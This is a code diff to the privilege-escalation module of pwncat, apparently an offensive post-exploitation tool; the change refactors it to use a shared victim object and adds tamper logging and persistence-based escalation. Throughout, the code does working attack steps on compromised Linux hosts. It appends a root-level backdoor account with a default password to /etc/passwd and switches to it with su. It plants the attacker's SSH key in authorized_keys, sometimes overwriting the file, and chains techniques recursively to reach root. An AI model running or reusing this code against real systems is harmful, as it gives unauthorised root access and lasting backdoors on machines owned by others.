@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from typing import Type, List, Tuple
+from typing import Type, List, Tuple, Optional
 from prompt_toolkit.shortcuts import confirm
 from colorama import Fore
 import crypt
@@ -9,6 +9,7 @@ from pprint import pprint
 import re
 import os
 
+import pwncat
 from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod
 from pwncat.privesc.setuid import SetuidMethod
 from pwncat.privesc.sudo import SudoMethod
@@ -34,35 +35,18 @@ class Finder:
     DEFAULT_BACKDOOR_NAME = "pwncat"
     DEFAULT_BACKDOOR_PASS = "pwncat"
 
-    def __init__(
-        self,
-        pty: "pwncat.pty.PtyHandler",
-        backdoor_user: str = None,
-        backdoor_password: str = None,
-    ):
+    def __init__(self,):
         """ Create a new privesc finder """
 
-        self.pty = pty
-        # A user we added which has UID=0 privileges
+        # A user we added_lines which has UID=0 privileges
         self.backdoor_user = None
-        self.backdoor_user_name = backdoor_user
-        self.backdoor_password = backdoor_password
         self.methods: List[Method] = []
         for m in privesc_methods:
             try:
-                m.check(self.pty)
-                self.methods.append(m(self.pty))
+                m.check(pwncat.victim)
+                self.methods.append(m(pwncat.victim))
             except PrivescError:
                 pass
-
-        if backdoor_user is None:
-            self.backdoor_user_name = Finder.DEFAULT_BACKDOOR_NAME
-        if backdoor_password is None:
-            self.backdoor_password = Finder.DEFAULT_BACKDOOR_PASS
-
-        if self.backdoor_user_name in self.pty.users:
-            self.pty.users[self.backdoor_user_name]["password"] = self.backdoor_password
-            self.backdoor_user = self.pty.users[self.backdoor_user_name]
 
     def search(self, target_user: str = None) -> List[Technique]:
         """ Search for privesc techniques for the current user to get to the
@@ -88,39 +72,44 @@ class Finder:
         called in order to solidify full UID=0 access (e.g. when SUID binaries
         yield a EUID=0 but UID!=0. """
 
-        self.pty.reload_users()
+        pwncat.victim.reload_users()
 
-        if self.backdoor_user_name not in self.pty.users:
+        if pwncat.victim.config["backdoor_user"] not in pwncat.victim.users:
 
             # Read /etc/passwd
-            with self.pty.open("/etc/passwd", "r") as filp:
-                data = filp.readlines()
+            with pwncat.victim.open("/etc/passwd", "r") as filp:
+                lines = filp.readlines()
 
             # Add a new user
-            password = crypt.crypt(self.backdoor_password)
-            user = self.backdoor_user_name
-            data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}\n")
+            password = crypt.crypt(pwncat.victim.config["backdoor_pass"])
+            user = pwncat.victim.config["backdoor_user"]
+            lines.append(f"{user}:{password}:0:0::/root:{pwncat.victim.shell}\n")
 
             # Prepare data for transmission
-            data = "".join(data)
+            data = "".join(lines)
 
             # Write the data. Giving open the length opens up some other writing
             # options from GTFObins
-            with self.pty.open("/etc/passwd", "w", length=len(data)) as filp:
+            with pwncat.victim.open("/etc/passwd", "w", length=len(data)) as filp:
                 filp.write(data)
 
             # Reload the /etc/passwd data
-            self.pty.reload_users()
+            pwncat.victim.reload_users()
 
-            if self.backdoor_user_name not in self.pty.users:
+            if pwncat.victim.config["backdoor_user"] not in pwncat.victim.users:
                 raise PrivescError("/etc/passwd update failed!")
 
-        self.pty.process(f"su {self.backdoor_user_name}", delim=False)
-        self.pty.recvuntil(": ")
-        self.pty.flush_output()
+            # Log our tamper
+            pwncat.victim.tamper.modified_file("/etc/passwd", added_lines=lines[-1:])
 
-        self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
-        self.pty.run("echo")
+        pwncat.victim.run(f"su {pwncat.victim.config['backdoor_user']}", wait=False)
+        pwncat.victim.recvuntil(": ")
+        pwncat.victim.flush_output()
+
+        pwncat.victim.client.send(
+            pwncat.victim.config["backdoor_pass"].encode("utf-8") + b"\n"
+        )
+        pwncat.victim.run("echo")
 
     def write_file(
         self,
@@ -136,13 +125,13 @@ class Finder:
         if target_user is None:
             target_user = "root"
 
-        current_user = self.pty.current_user
+        current_user = pwncat.victim.current_user
         if (
             target_user == current_user["name"]
             or current_user["uid"] == 0
             or current_user["name"] == "root"
         ):
-            with self.pty.open(filename, "wb", length=len(data)) as filp:
+            with pwncat.victim.open(filename, "wb", length=len(data)) as filp:
                 filp.write(data)
             return chain
 
@@ -173,7 +162,7 @@ class Finder:
             except PrivescError:
                 pass
 
-        shlvl = self.pty.getenv("SHLVL")
+        shlvl = pwncat.victim.getenv("SHLVL")
 
         # We can't escalate directly to the target to read a file. So, try recursively
         # against other users.
@@ -193,7 +182,7 @@ class Finder:
                 )
             except PrivescError:
                 tech, exit_command = chain[-1]
-                self.pty.run(exit_command, wait=False)
+                pwncat.victim.run(exit_command, wait=False)
                 chain.pop()
 
         raise PrivescError(f"no route to {target_user} found")
@@ -210,13 +199,13 @@ class Finder:
         if target_user is None:
             target_user = "root"
 
-        current_user = self.pty.current_user
+        current_user = pwncat.victim.current_user
         if (
             target_user == current_user["name"]
             or current_user["uid"] == 0
             or current_user["name"] == "root"
         ):
-            pipe = self.pty.open(filename, "rb")
+            pipe = pwncat.victim.open(filename, "rb")
             return pipe, chain
 
         if starting_user is None:
@@ -245,7 +234,7 @@ class Finder:
             except PrivescError:
                 pass
 
-        shlvl = self.pty.getenv("SHLVL")
+        shlvl = pwncat.victim.getenv("SHLVL")
 
         # We can't escalate directly to the target to read a file. So, try recursively
         # against other users.
@@ -265,12 +254,14 @@ class Finder:
                 )
             except PrivescError:
                 tech, exit_command = chain[-1]
-                self.pty.run(exit_command, wait=False)
+                pwncat.victim.run(exit_command, wait=False)
                 chain.pop()
 
         raise PrivescError(f"no route to {target_user} found")
 
-    def escalate_single(self, techniques: List[Technique], shlvl: str) -> str:
+    def escalate_single(
+        self, techniques: List[Technique], shlvl: str
+    ) -> Tuple[Optional[Technique], str]:
         """ Use the given list of techniques to escalate to the user. All techniques
         should be for the same user. This method will attempt a variety of privesc
         methods. Primarily, it will directly execute any techniques which provide
@@ -286,32 +277,33 @@ class Finder:
                 try:
                     # Attempt our basic, known technique
                     exit_script = technique.method.execute(technique)
-                    self.pty.flush_output()
+                    pwncat.victim.flush_output()
 
                     # Reset the terminal to ensure we are stable
-                    self.pty.reset()
+                    pwncat.victim.reset()
 
                     # Check that we actually succeeded
-                    current = self.pty.whoami()
+                    current = pwncat.victim.whoami()
 
                     if current == technique.user or (
-                        technique.user == self.backdoor_user_name and current == "root"
+                        technique.user == pwncat.victim.config["backdoor_user"]
+                        and current == "root"
                     ):
-                        self.pty.flush_output()
+                        pwncat.victim.flush_output()
                         return technique, exit_script
 
                     # Check if we ended up in a sub-shell without escalating
-                    if self.pty.getenv("SHLVL") != shlvl:
+                    if pwncat.victim.getenv("SHLVL") != shlvl:
 
                         # Get out of this subshell. We don't need it
-                        # self.pty.process(exit_script, delim=False)
-                        self.pty.run(exit_script, wait=False)
-                        self.pty.recvuntil("\n")
+                        # pwncat.victim.process(exit_script, delim=False)
+                        pwncat.victim.run(exit_script, wait=False)
+                        pwncat.victim.recvuntil("\n")
 
                         # Clean up whatever mess was left over
-                        self.pty.flush_output()
+                        pwncat.victim.flush_output()
 
-                        self.pty.reset()
+                        pwncat.victim.reset()
 
                     # The privesc didn't work, but didn't throw an exception.
                     # Continue on as if it hadn't worked.
@@ -325,46 +317,55 @@ class Finder:
         if writers and writers[0].user == "root":
 
             # We need su to privesc w/ file write
-            su_command = self.pty.which("su", quote=True)
+            su_command = pwncat.victim.which("su", quote=True)
             if su_command is not None:
 
                 # Grab the first writer
                 writer = writers[0]
 
                 # Read /etc/passwd
-                with self.pty.open("/etc/passwd", "r") as filp:
-                    data = filp.readlines()
+                with pwncat.victim.open("/etc/passwd", "r") as filp:
+                    lines = filp.readlines()
 
                 # Add a new user
-                password = crypt.crypt(self.backdoor_password)
-                user = self.backdoor_user_name
-                data.append(f"{user}:{password}:0:0::/root:{self.pty.shell}\n")
+                password = crypt.crypt(pwncat.victim.config["backdoor_pass"])
+                user = pwncat.victim.config["backdoor_user"]
+                lines.append(f"{user}:{password}:0:0::/root:{pwncat.victim.shell}\n")
 
                 # Join the data back and encode it
-                data = ("".join(data)).encode("utf-8")
+                data = ("".join(lines)).encode("utf-8")
 
                 # Write the data
                 writer.method.write_file("/etc/passwd", data, writer)
 
                 # Maybe help?
-                self.pty.run("echo")
+                pwncat.victim.run("echo")
 
                 # Check that it succeeded
-                users = self.pty.reload_users()
+                users = pwncat.victim.reload_users()
 
                 # Check if the new passwd file contained the file
                 if user in users:
-                    self.pty.users[user]["password"] = self.backdoor_password
-                    self.backdoor_user = self.pty.users[user]
+                    # Log our tamper of this file
+                    pwncat.victim.tamper.modified_file(
+                        "/etc/passwd", added_lines=lines[-1:]
+                    )
+
+                    pwncat.victim.users[user]["password"] = pwncat.victim.config[
+                        "backdoor_pass"
+                    ]
+                    self.backdoor_user = pwncat.victim.users[user]
 
                     # Switch to the new user
-                    # self.pty.process(f"su {user}", delim=False)
-                    self.pty.process(f"su {user}", delim=True)
-                    self.pty.recvuntil(": ")
+                    # pwncat.victim.process(f"su {user}", delim=False)
+                    pwncat.victim.process(f"su {user}", delim=True)
+                    pwncat.victim.recvuntil(": ")
 
-                    self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
+                    pwncat.victim.client.send(
+                        pwncat.victim.config["backdoor_pass"].encode("utf-8") + b"\n"
+                    )
 
-                    self.pty.flush_output()
+                    pwncat.victim.flush_output()
 
                     return writer, "exit"
 
@@ -375,22 +376,22 @@ class Finder:
 
         # Check if there is an SSH server running
         sshd_running = False
-        ps = self.pty.which("ps")
+        ps = pwncat.victim.which("ps")
         if ps is not None:
             sshd_running = (
-                b"sshd" in self.pty.subprocess("ps -o command -e", "r").read()
+                b"sshd" in pwncat.victim.subprocess("ps -o command -e", "r").read()
             )
         else:
-            pgrep = self.pty.which("pgrep")
+            pgrep = pwncat.victim.which("pgrep")
             if pgrep is not None:
                 sshd_running = (
-                    self.pty.subprocess("pgrep 'sshd'", "r").read().strip() != b""
+                    pwncat.victim.subprocess("pgrep 'sshd'", "r").read().strip() != b""
                 )
 
         sshd_listening = False
         sshd_address = None
         netstat = (
-            self.pty.subprocess(
+            pwncat.victim.subprocess(
                 "netstat -anotp 2>/dev/null | grep LISTEN | grep -v tcp6 | grep ':22'",
                 "r",
             )
@@ -416,15 +417,20 @@ class Finder:
             )
 
             authkeys_path = ".ssh/authorized_keys"
-            with self.pty.open("/etc/ssh/sshd_config", "r") as filp:
-                for line in filp:
-                    if line.startswith("AuthorizedKeysFile"):
-                        authkeys_path = line.strip().split()[-1]
+
+            try:
+                with pwncat.victim.open("/etc/ssh/sshd_config", "r") as filp:
+                    for line in filp:
+                        if line.startswith("AuthorizedKeysFile"):
+                            authkeys_path = line.strip().split()[-1]
+            except PermissionError:
+                # We couldn't read the file. Assume they are located in the default home directory location
+                authkeys_path = ".ssh/authorized_keys"
 
             # AuthorizedKeysFile is normally relative to the home directory
             if not authkeys_path.startswith("/"):
                 # Grab the user information from /etc/passwd
-                home = self.pty.users[techniques[0].user]["home"]
+                home = pwncat.victim.users[techniques[0].user]["home"]
 
                 if home == "" or home is None:
                     raise PrivescError("no user home directory, can't add ssh keys")
@@ -454,12 +460,12 @@ class Finder:
                 # authenticate without a password and without clobbering their
                 # keys.
                 ssh_key_glob = os.path.join(
-                    self.pty.users[reader.user]["home"], ".ssh", "*.pub"
+                    pwncat.victim.users[reader.user]["home"], ".ssh", "*.pub"
                 )
-                # keys = self.pty.run(f"ls {ssh_key_glob}").strip().decode("utf-8")
+                # keys = pwncat.victim.run(f"ls {ssh_key_glob}").strip().decode("utf-8")
                 keys = ["id_rsa.pub"]
                 keys = [
-                    os.path.join(self.pty.users[reader.user]["home"], ".ssh", key)
+                    os.path.join(pwncat.victim.users[reader.user]["home"], ".ssh", key)
                     for key in keys
                 ]
 
@@ -485,7 +491,7 @@ class Finder:
                         # Make sure the private key exists
                         if (
                             b"no such file"
-                            in self.pty.run(f"file {privkey_path}").lower()
+                            in pwncat.victim.run(f"file {privkey_path}").lower()
                         ):
                             util.progress(
                                 f"{Fore.CYAN}{os.path.basename(pubkey_path)}{Fore.RESET} "
@@ -533,10 +539,10 @@ class Finder:
             writer = writers[0]
 
             # Write our private key to a random location
-            with open(self.pty.default_privkey, "r") as src:
+            with open(pwncat.victim.default_privkey, "r") as src:
                 privkey = src.read()
 
-            with open(self.pty.default_privkey + ".pub", "r") as src:
+            with open(pwncat.victim.default_privkey + ".pub", "r") as src:
                 pubkey = src.read().strip()
 
             # Add our public key to the authkeys
@@ -547,12 +553,20 @@ class Finder:
                 authkeys_path, ("\n".join(authkeys) + "\n").encode("utf-8"), writer
             )
 
+            if len(authkeys) > 1:
+                pwncat.victim.tamper.modified_file(
+                    authkeys_path, added_lines=pubkey + "\n"
+                )
+            else:
+                # We couldn't read their authkeys, but log that we clobbered it. The user asked us to.  :shrug:
+                pwncat.victim.tamper.modified_file(authkeys_path)
+
             used_technique = writer
 
         # SSH private keys are annoying and **NEED** a newline
         privkey = privkey.strip() + "\n"
 
-        with self.pty.tempfile("w", length=len(privkey)) as dst:
+        with pwncat.victim.tempfile("w", length=len(privkey)) as dst:
             # Write the file with a nice progress bar
             dst.write(privkey)
             # Save the path to the private key. We don't need the original path,
@@ -560,29 +574,32 @@ class Finder:
             # one directly.
             privkey_path = dst.name
 
+        # Log that we created a file
+        pwncat.victim.tamper.created_file(privkey_path)
+
         # Ensure the permissions are right so ssh doesn't freak out
-        self.pty.run(f"chmod 600 {privkey_path}")
+        pwncat.victim.run(f"chmod 600 {privkey_path}")
 
         # Run ssh as the given user with our new private key
         util.progress(
             f"attempting {Fore.RED}ssh{Fore.RESET} to "
             f"localhost as {Fore.GREEN}{techniques[0].user}{Fore.RESET}"
         )
-        ssh = self.pty.which("ssh")
+        ssh = pwncat.victim.which("ssh")
 
         # First, run a test to make sure we authenticate
         command = (
             f"{ssh} -i {privkey_path} -o StrictHostKeyChecking=no -o PasswordAuthentication=no "
             f"{techniques[0].user}@127.0.0.1"
         )
-        output = self.pty.run(f"{command} echo good")
+        output = pwncat.victim.run(f"{command} echo good")
 
         # Check if we succeeded
         if b"good" not in output:
             raise PrivescError("ssh private key failed")
 
         # Great! Call SSH again!
-        self.pty.process(command)
+        pwncat.victim.process(command)
 
         # Pretty sure this worked!
         return used_technique, "exit"
@@ -591,19 +608,19 @@ class Finder:
         self,
         target_user: str = None,
         depth: int = None,
-        chain: List[Technique] = [],
+        chain: List[Technique] = None,
         starting_user=None,
     ) -> List[Tuple[Technique, str]]:
         """ Search for a technique chain which will gain access as the given 
         user. """
 
+        if chain is None:
+            chain = []
+
         if target_user is None:
             target_user = "root"
 
-        if target_user == "root" and self.backdoor_user:
-            target_user = self.backdoor_user["name"]
-
-        current_user = self.pty.current_user
+        current_user = pwncat.victim.current_user
         if (
             target_user == current_user["name"]
             or current_user["uid"] == 0
@@ -618,7 +635,28 @@ class Finder:
             raise PrivescError("max depth reached")
 
         # Capture current shell level
-        shlvl = self.pty.getenv("SHLVL")
+        shlvl = pwncat.victim.getenv("SHLVL")
+
+        # Check if we have a persistence method for this user
+        util.progress(f"checking local persistence implants")
+        for persist in pwncat.victim.persist.find(
+            installed=True, local=True, user=target_user
+        ):
+            util.progress(
+                f"checking local persistence implants: {persist.format(target_user)}"
+            )
+            # Attempt to escalate with the local persistence method
+            if persist.escalate(target_user):
+
+                # The method thought it worked, but didn't appear to
+                if pwncat.victim.whoami() != target_user:
+                    if pwncat.victim.getenv("SHLVL") != shlvl:
+                        pwncat.victim.run("exit", wait=False)
+                    continue
+
+                # It worked!
+                chain.append((f"persistence - {persist.format(target_user)}", "exit"))
+                return chain
 
         # Enumerate escalation options for this user
         techniques = {}
@@ -635,10 +673,13 @@ class Finder:
             except PrivescError:
                 pass
 
-        if target_user == "root" and self.backdoor_user_name in techniques:
+        if (
+            target_user == "root"
+            and pwncat.victim.config["backdoor_user"] in techniques
+        ):
             try:
                 tech, exit_command = self.escalate_single(
-                    techniques[self.backdoor_user_name], shlvl
+                    techniques[pwncat.victim.config["backdoor_user"]], shlvl
                 )
                 chain.append((tech, exit_command))
                 return chain
@@ -656,21 +697,37 @@ class Finder:
             except PrivescError:
                 pass
 
-        if self.backdoor_user_name in techniques:
-            try:
-                tech, exit_command = self.escalate_single(
-                    techniques[self.backdoor_user_name], shlvl
+        # Try to use persistence as other users
+        util.progress(f"checking local persistence implants")
+        for user in pwncat.victim.users:
+            if self.in_chain(user, chain):
+                continue
+            util.progress(f"checking local persistence implants: {user}")
+            for persist in pwncat.victim.persist.find(
+                installed=True, local=True, system=False, user=user
+            ):
+                util.progress(
+                    f"checking local persistence implants: {persist.format(user)}"
                 )
-                chain.append((tech, exit_command))
-            except PrivescError:
-                pass
-            else:
-                try:
-                    return self.escalate(target_user, depth, chain, starting_user)
-                except PrivescError:
-                    tech, exit_command = chain[-1]
-                    self.pty.run(exit_command, wait=False)
-                    chain.pop()
+                if persist.escalate(user):
+                    if pwncat.victim.whoami() != user:
+                        if pwncat.victim.getenv("SHLVL") != shlvl:
+                            pwncat.victim.run("exit", wait=False)
+                        continue
+
+                    chain.append(
+                        (f"persistence - {persist.format(target_user)}", "exit")
+                    )
+
+                    try:
+                        return self.escalate(target_user, depth, chain, starting_user)
+                    except PrivescError:
+                        chain.pop()
+                        pwncat.victim.run("exit", wait=False)
+
+                    # Don't retry later
+                    if user in techniques:
+                        del techniques[user]
 
         # We can't escalate directly to the target. Instead, try recursively
         # against other users.
@@ -688,7 +745,7 @@ class Finder:
                 return self.escalate(target_user, depth, chain, starting_user)
             except PrivescError:
                 tech, exit_command = chain[-1]
-                self.pty.run(exit_command, wait=False)
+                pwncat.victim.run(exit_command, wait=False)
                 chain.pop()
 
         raise PrivescError(f"no route to {target_user} found")
@@ -703,9 +760,9 @@ class Finder:
     def unwrap(self, techniques: List[Tuple[Technique, str]]):
         # Work backwards to get back to the original shell
         for technique, exit in reversed(techniques):
-            self.pty.run(exit, wait=False)
+            pwncat.victim.run(exit, wait=False)
 
-        self.pty.flush_output()
+        pwncat.victim.flush_output()
 
         # Reset the terminal to get to a sane prompt
-        self.pty.reset()
+        pwncat.victim.reset()
